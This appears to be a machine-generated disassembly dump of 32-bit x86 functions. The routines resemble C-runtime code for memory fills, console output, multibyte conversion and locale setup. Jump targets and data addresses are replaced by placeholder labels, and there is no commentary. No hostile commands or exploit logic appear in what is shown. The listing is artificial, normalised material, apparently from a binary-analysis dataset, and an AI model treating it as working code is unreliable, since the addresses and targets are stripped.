and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_417f56
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rwxdata ] 0xfffffffe
jne r-xdata
mov eax [ rwxdata ]
cmp eax 0xffffffff
jne r-xdata
call sub_41bb0e
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_417f98
push 0xc
push r--data
call sub_40f510
push 0x3
call sub_40f40a
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_417f56
pop ecx
movzx eax ax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417fd5
mov ax [ ebp - 0x1c ]
call sub_40f555
retn
sub_417fde
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_4144f3
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_40d1fa
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_418110
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_41813b
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_40d831
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_4144f3
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_419a91
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_4181f3
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41813b
add esp 0xc
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0xc ]
pop ebp
retn
sub_418231
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_413fc5
pop ecx
pop edi
sub_418257
mov edi edi
push ebp
mov ebp esp
push esi
call sub_41258b
mov ecx [ eax + 0x70 ]
push 0x0
pop edx
test cl 0x2
sete dl
lea esi [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
cmp edx 0xffffffff
je r-xdata
or [ rwxdata ] 0xffffffff
test edx edx
je r-xdata
mov eax esi
cmp edx 0x1
je r-xdata
or ecx 0x2
cmp edx 0x2
je r-xdata
and ecx 0xfffffffd
jmp r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or eax 0xffffffff
jmp r-xdata
mov [ eax + 0x70 ] ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_4182de
push 0x8
push r--data
call sub_40f510
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_40f555
retn
push 0xd
call sub_40f40a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41838b
cmp [ esi ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax 0xbaadf00d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
push esi
call sub_40b955
pop ecx
push 0xc
call sub_40f40a
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_414054
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax rwxdata
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_418397
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_40b955
pop ecx
cmp eax rwxdata
je r-xdata
push eax
call sub_4140ed
pop ecx
sub_4183ab
push 0xc
push r--data
call sub_40f510
call sub_41258b
mov edi eax
push 0x1
push 0x8
call sub_40ef0a
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
test esi esi
jne r-xdata
call sub_414285
call sub_413ac6
mov eax [ edi + 0x6c ]
mov [ esi ] eax
mov eax [ edi + 0x68 ]
mov [ esi + 0x4 ] eax
push 0xc
call sub_40f40a
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi ]
call sub_413fc5
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_418445
push 0xd
call sub_40f40a
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi + 0x4 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_418451
mov eax esi
call sub_40d1fa
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_40f555
retn
sub_418462
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
xor ebx ebx
xor edi edi
cmp [ ebp + 0x10 ] ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40e6c1
int3
inc edi
cmp edi [ ebp + 0x10 ]
jl r-xdata
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41bb47
add esp 0xc
test eax eax
jne r-xdata
pop esi
sub_4184a3
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_4105f0
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_41bbc0
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_419208
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ edi + 0x8f ] bl
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_419208
add esp 0x10
test eax eax
jne r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
cmp bl 0x2c
je r-xdata
call sub_40e6c1
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_41bbc0
test eax eax
sub_4185c2
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_419700
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40e6c1
int3
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418462
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418462
add esp 0x14
sub_41862d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0xc ] ebx
call sub_40eec5
pop ecx
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
push [ esi + 0x58 ]
mov ebx 0x351
push r--data
push [ r--data ]
push 0x3
push ebx
push edi
call sub_418462
lea eax [ esi + 0x58 ]
add esp 0x18
mov [ ebp - 0x4 ] r--data
mov [ ebp - 0x8 ] eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40e6c1
mov eax [ ebp - 0x8 ]
lea ecx [ eax + 0x10 ]
push [ ecx ]
mov [ ebp - 0x8 ] ecx
push [ eax ]
call sub_41bc10
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push [ eax ]
add [ ebp - 0x4 ] 0xc
push r--data
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push [ eax ]
push 0x3
push ebx
push edi
call sub_418462
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0xc ] 0x0
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_40b955
pop ecx
push r--data
push ebx
push edi
call sub_41bb47
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push [ esi + 0x54 ]
call sub_40b955
pop ecx
push [ ebp - 0x10 ]
call sub_40b955
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_40b955
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_40b955
pop ecx
sub_418792
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_41258b
lea ecx [ eax + 0xc4 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0xc8 ]
lea ebx [ eax + 0xbc ]
add eax 0x14b
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_413290
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
and [ ebp - 0xb4 ] 0x0
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_4184a3
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_41bc10
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_419700
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x94 ]
push eax
push ebx
push eax
call sub_41c265
add esp 0xc
test eax eax
je r-xdata
xor esi esi
cmp [ ebp - 0xa4 ] esi
je r-xdata
push esi
push [ ebp - 0xa8 ]
call sub_41bc10
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
test edi edi
je r-xdata
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_4185c2
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_411080
add esp 0xc
mov eax [ ebp - 0xa0 ]
test eax eax
je r-xdata
mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_419700
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_411080
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
and [ eax ] 0x0
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_419208
add esp 0x10
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
jmp r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
call sub_40e6c1
sub_4189b3
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c8
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push edi
mov [ ebp - 0x190 ] ebx
mov [ ebp - 0x198 ] eax
call sub_41258b
mov edi eax
push ebx
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push [ ebp - 0x198 ]
call sub_418792
add esp 0x18
test eax eax
jne r-xdata
shl ebx 0x4
add ebx esi
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_41bc10
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x88 ]
push eax
call sub_413290
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_40eec5
pop ecx
pop ecx
mov [ ebp - 0x194 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x48 ]
jmp r-xdata
mov eax [ ebx + 0x48 ]
mov ecx [ ebp - 0x190 ]
mov [ ebp - 0x198 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
mov [ ebp - 0x1a8 ] eax
mov eax [ eax ]
mov [ ebp - 0x1b8 ] eax
lea eax [ ecx + 0x6 ]
imul eax eax 0x6
add eax esi
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c8 ]
push eax
call sub_411080
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x194 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_419700
add esp 0x18
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40e6c1
int3
mov eax [ ebp - 0x194 ]
mov ecx [ ebp - 0x1a8 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_411080
add esp 0xc
cmp [ ebp - 0x190 ] 0x2
jne r-xdata
cmp [ ebp - 0x190 ] 0x1
jne r-xdata
mov eax [ ebp - 0x1a4 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x1f4 ]
mov ecx [ edi + 0x1f0 ]
mov [ ebp - 0x19c ] eax
lea eax [ edi + 0x1d0 ]
mov eax [ ebp - 0x190 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x1a4 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1c0 ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1c0 ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x198 ] rwxdata
je r-xdata
mov eax [ ebp - 0x198 ]
push [ ebp - 0x194 ]
mov [ ebx + 0x48 ] eax
call sub_40b955
mov eax [ ebp - 0x1b8 ]
pop ecx
mov ecx [ ebp - 0x1a8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 + 0x1d0 ]
mov edx [ eax ]
mov [ edi + 0x1d0 ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x1d4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x190 ]
mov eax [ ebp - 0x194 ]
add ecx 0x5
add ecx ecx
mov [ eax ] 0x1
mov [ esi + ecx * 8 ] eax
jmp r-xdata
mov edi [ ebp - 0x190 ]
add edi 0x5
add edi edi
push [ esi + edi * 8 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x1d4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_419a91
add esp 0x20
test eax eax
je r-xdata
push [ esi + edi * 8 ]
call sub_40b955
push [ ebx + 0x54 ]
call sub_40b955
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x1d4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rwxdata ]
lea eax [ ebp - 0x188 ]
push eax
call sub_41d970
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x1d4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x1d0 ] eax
sub_418ced
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp ecx ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
call sub_41862d
cmp [ eax ] 0x4c
jne r-xdata
add ecx ecx
mov eax [ esi + ecx * 8 + 0x48 ]
jmp r-xdata
push eax
call sub_4189b3
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea ecx [ ebp - 0x88 ]
push ecx
push eax
call sub_418792
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ eax + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
lea edi [ esi + 0x48 ]
cmp [ eax + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_41bc10
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi eax
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
lea eax [ ebp - 0x88 ]
push eax
mov ecx ebx
call sub_4189b3
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_41ba4e
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_413290
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_41bbc0
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_419208
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40e6c1
mov ecx [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
mov [ ebp + edi - 0x88 ] al
lea eax [ ebp - 0x88 ]
push eax
call sub_4189b3
pop ecx
test eax eax
je r-xdata
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_41eed0
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_418f09
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x5
push esi
push edi
ja r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor edi edi
inc edi
push edi
push 0x8
call sub_40ef0a
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
push edi
push 0xd8
call sub_40ef0a
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_40d1fa
mov [ eax ] 0xc
push edi
push 0x220
call sub_40ef0a
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
push esi
call sub_40b955
mov eax [ esi ]
mov ecx rwxdata
call sub_418231
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ esi ]
call sub_418ced
pop ecx
test eax eax
jne r-xdata
push [ esi ]
call sub_40b955
push esi
call sub_40b955
pop ecx
jmp r-xdata
push [ esi + 0x4 ]
mov eax [ esi ]
push [ eax + 0x4 ]
call sub_413be6
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi ]
call sub_414054
push [ esi ]
call sub_4140ed
push esi
call sub_40b955
add esp 0xc
jmp r-xdata
pop ecx
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ eax ] edi
push [ esi + 0x4 ]
call sub_40b955
push [ esi ]
call sub_414054
push [ esi ]
call sub_4140ed
push esi
call sub_40b955
add esp 0x10
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax esi
jmp r-xdata
sub_419009
push 0x14
push r--data
call sub_40f510
and [ ebp - 0x20 ] 0x0
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_41258b
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_414285
or [ esi + 0x70 ] 0x10
and [ ebp - 0x4 ] 0x0
xor edi edi
inc edi
push edi
push 0xd8
call sub_40ef0a
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x24 ] ebx
test ebx ebx
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419178
mov eax [ ebp - 0x20 ]
push 0xc
call sub_40f40a
pop ecx
mov [ ebp - 0x4 ] edi
mov ecx [ esi + 0x6c ]
mov eax ebx
call sub_418231
and [ ebp - 0x4 ] 0x0
call sub_41913b
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx ebx
call sub_418ced
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
call sub_40f555
retn
push ebx
call sub_414054
push ebx
call sub_4140ed
pop ecx
pop ecx
cmp [ ebp + 0xc ] 0x0
